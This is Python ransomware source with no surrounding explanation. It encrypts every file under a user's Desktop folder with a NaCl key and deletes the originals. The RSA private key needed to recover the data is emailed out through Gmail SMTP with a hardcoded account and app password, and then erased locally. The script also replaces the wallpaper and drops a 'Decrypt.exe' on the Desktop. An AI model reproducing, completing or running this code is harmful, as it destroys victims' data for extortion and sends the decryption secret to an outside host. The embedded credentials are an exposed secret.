import threading, ctypes, nacl, tkinter, glob, shutil
import cryptography, os, requests, sys, nacl.secret, shutil
from PIL import Image, ImageDraw, ImageFont
from win32api import GetSystemMetrics
from tkinter import messagebox
from time import sleep
from secrets import SystemRandom
from random import randrange
from math import gcd
from decimal import Decimal
from miller_rabin import miller_rabin
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from smail import sign_message

E = 65537

def getprime(bits: int) -> int:
    
    secure_randrange = SystemRandom().randrange
    
    lowlimit = int(Decimal(2**0.5) * Decimal(2**(bits - 1)))
    lowlimit |= 1 
    highlimit = 2**bits    
    while True:
        p = secure_randrange(lowlimit, highlimit, 2)
        
        
        if gcd(E, p - 1) == 1:            
            if miller_rabin(p):
                return p

def rsa_keys(nlen: int) -> (int, int):
    if nlen not in (2048, 3072):
        print('Error. Use bits == 2048 or 3072')
        return 0, 0

    bits = nlen//2
    p = getprime(bits)
    while True:
        q = getprime(bits)
        
        if abs(p - q) > 2**(bits-100):

            phi = (p - 1) * (q - 1)

            if gcd(E, phi) == 1:
                n = p * q
                
                d = pow(E, -1, phi)
                
                if 2**bits < d < phi:
                    public_key = (E, n)
                    private_key = (d, n)
                    return public_key, private_key
def send_email(subject, body, sender, recipients, password):
    msg = MIMEMultipart()
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = ', '.join(recipients)
    msg.attach(MIMEText(body, "plain"))

    filename = "private.pem"  
    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    msg.attach(part)
    smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
    smtp_server.ehlo('Gmail')
    smtp_server.starttls()
    smtp_server.login(sender, password)
    smtp_server.sendmail(sender, recipients, msg.as_string().encode('ascii'))
    smtp_server.quit()
def after_work():
    User =  os.getlogin() 
    src_dir = r"C:/Users/"+User+"/AppData/Roaming/Microsoft/Windows/Themes/CachedFiles"
    dst_dir = r"C:/Users/"+User+'/wallpaper.jpg'
    for jpgfile in glob.iglob(os.path.join(src_dir, "*.jpg")):
        shutil.copy(jpgfile, dst_dir)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{os.getcwd()}\\background.png', 3)
    src_dir = os.getcwd()+'/DeRansomware.exe'
    dst_dir = r"C:/Users/"+User+"/Desktop/Decrypt.exe"
    shutil.copy(src_dir, dst_dir)
        
class Encrypt(object):              

    def __init__(self, Target=0, BoxM=0, Url=0):

        self.Target     = Target       
        self.BoxM       = BoxM           

    def FileE(loc):                   
        try:                           
            if (os.path.isdir(loc.Target) != True) :    

                with open(loc.Target, "rb") as File:    
                        Date    = File.read()           
               
                FileName    = loc.Target                
                Encrypted   = loc.BoxM.encrypt(Date)
                if(loc.Target != sys.argv[0]):          
                    with open(f"{FileName}.locked","wb") as File: 
                        File.write(Encrypted)           
                    os.remove(loc.Target)               
        except Exception as e:print(f"Error -> {e}")
                 

User        =  os.getlogin()                              
Script      = sys.argv[0]                                 
MaxThread   = 120                                         

Key         = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)  
hexed_key = Key.hex()                                            
Box         = nacl.secret.SecretBox(Key)                                              

Message     = (f"{User} -> {Key}")                                      
PathList    = [r"C:/Users/"+User+"/Desktop/files"]   
print(PathList)                                        

publicKey, privateKey = rsa_keys(2048)
e = publicKey[0]
d = privateKey[0]
n = publicKey[1]
privateKey = RSA.construct((n, e, d))
publicKey = RSA.construct((n, e))
privateKey = privateKey.export_key()
publicKey = publicKey.export_key()
print(publicKey)
file_out = open("private.pem", "wb")
file_out.write(privateKey)
file_out.close()
file_out = open("receiver.pem", "wb")
file_out.write(publicKey)
file_out.close()
recipient_key = RSA.import_key(open("receiver.pem").read())
cipher_rsa = PKCS1_OAEP.new(recipient_key)
message = hexed_key.encode('utf-8')
encMessage = cipher_rsa.encrypt(message)
file_out = open("C:/Users/"+User+"/appdata/local/temp/encrypted_key.txt", "wb")
file_out.write(encMessage)
file_out.close()

subject = "New User Key"
body = f"The keys are attached to the mail"
sender = "detroitdre2022@gmail.com"
recipients = ["test_key_dre@hotmail.com"]
password = "yaikwnsfztqybqdg"
send_email(subject, body, sender, recipients, password) 
os.remove('receiver.pem')
os.remove('private.pem')
if __name__ == '__main__':  
    for  AllFiles in PathList:
        for path, subdirs, files in os.walk(AllFiles):                              
            for name in files:                              
                FilePath    = os.path.join(path, name)      
                FileSize    = os.stat(FilePath).st_size    
                if (FileSize >= 50000000 ):             
                    while True:                         
                        if len(threading.enumerate()) < MaxThread: 
                            EncrypterObj = Encrypt(FilePath, Box) 
                            threading.Thread(target=EncrypterObj.FileE, args=()).start() 
                            break                                                        
        
                        else: sleep(0.2)                                                 
                else :               
                    Encrypt(FilePath, Box).FileE()                 
    after_work()
